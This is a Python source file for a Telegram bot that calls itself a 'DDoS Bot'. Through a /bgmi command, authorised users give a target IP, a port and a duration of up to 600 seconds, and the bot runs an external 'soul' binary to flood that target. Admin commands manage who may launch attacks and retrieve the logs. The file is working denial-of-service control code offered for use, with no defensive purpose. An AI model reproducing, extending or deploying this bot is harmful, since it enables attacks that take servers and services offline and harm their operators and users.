import os
import subprocess
import datetime
import telebot
from keep_alive import keep_alive

# Start Flask server to keep the script alive
keep_alive()

# Insert your Telegram bot token here
bot = telebot.TeleBot('YOUR_TELEGRAM_BOT_TOKEN')

# Admin user IDs
admin_ids = ["ADMIN_USER_ID"]  # Replace with actual admin IDs

# File paths
USER_FILE = "users.txt"
LOG_FILE = "log.txt"
SOUL_BINARY = "./soul"  # Path to the soul binary

# Ensure the soul binary is executable
if not os.path.isfile(SOUL_BINARY):
    raise FileNotFoundError(f"The soul binary was not found at {SOUL_BINARY}.")
if not os.access(SOUL_BINARY, os.X_OK):
    os.chmod(SOUL_BINARY, 0o755)

# Function to read users
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

allowed_user_ids = read_users()

# Function to log commands
def log_command(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Command: {command} | Target: {target} | Port: {port} | Time: {time} | Timestamp: {datetime.datetime.now()}\n"
    with open(LOG_FILE, "a") as log_file:
        log_file.write(log_entry)

# Command: /start
@bot.message_handler(commands=['start'])
def start_command(message):
    bot.reply_to(message, "Welcome to the DDoS Bot! Use /help for available commands.")

# Command: /help
@bot.message_handler(commands=['help'])
def help_command(message):
    bot.reply_to(message, """
Available commands:
/start - Welcome message
/help - Display this help message
/bgmi <target> <port> <time> - Run attack using the soul binary
/add <user_id> - Add a user (admin only)
/remove <user_id> - Remove a user (admin only)
/allusers - List all authorized users (admin only)
/logs - Retrieve log file (admin only)
""")

# Command: /bgmi
@bot.message_handler(commands=['bgmi'])
def bgmi_command(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            args = message.text.split()
            if len(args) != 4:
                bot.reply_to(message, "Usage: /bgmi <target> <port> <time>")
                return

            target, port, time = args[1], int(args[2]), int(args[3])
            if time > 600:
                bot.reply_to(message, "Error: Maximum time allowed is 600 seconds.")
                return

            log_command(user_id, "/bgmi", target, port, time)
            bot.reply_to(message, f"Attack started: Target={target}, Port={port}, Time={time}s")

            # Execute the soul binary
            command = [SOUL_BINARY, target, str(port), str(time)]
            subprocess.run(command)
            
            bot.reply_to(message, "Attack completed successfully!")
        except Exception as e:
            bot.reply_to(message, f"Error: {str(e)}")
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

# Admin Command: /add
@bot.message_handler(commands=['add'])
def add_user_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids:
        args = message.text.split()
        if len(args) != 2:
            bot.reply_to(message, "Usage: /add <user_id>")
            return

        new_user_id = args[1]
        if new_user_id not in allowed_user_ids:
            allowed_user_ids.append(new_user_id)
            with open(USER_FILE, "a") as file:
                file.write(new_user_id + "\n")
            bot.reply_to(message, f"User {new_user_id} added successfully.")
        else:
            bot.reply_to(message, "User already exists.")
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

# Admin Command: /remove
@bot.message_handler(commands=['remove'])
def remove_user_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids:
        args = message.text.split()
        if len(args) != 2:
            bot.reply_to(message, "Usage: /remove <user_id>")
            return

        remove_user_id = args[1]
        if remove_user_id in allowed_user_ids:
            allowed_user_ids.remove(remove_user_id)
            with open(USER_FILE, "w") as file:
                for uid in allowed_user_ids:
                    file.write(uid + "\n")
            bot.reply_to(message, f"User {remove_user_id} removed successfully.")
        else:
            bot.reply_to(message, "User not found.")
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

# Admin Command: /allusers
@bot.message_handler(commands=['allusers'])
def all_users_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids:
        if allowed_user_ids:
            bot.reply_to(message, "Authorized Users:\n" + "\n".join(allowed_user_ids))
        else:
            bot.reply_to(message, "No authorized users found.")
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

# Admin Command: /logs
@bot.message_handler(commands=['logs'])
def logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids:
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "r") as file:
                bot.send_document(user_id, file)
        else:
            bot.reply_to(message, "No logs found.")
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

# Run the bot
bot.polling()
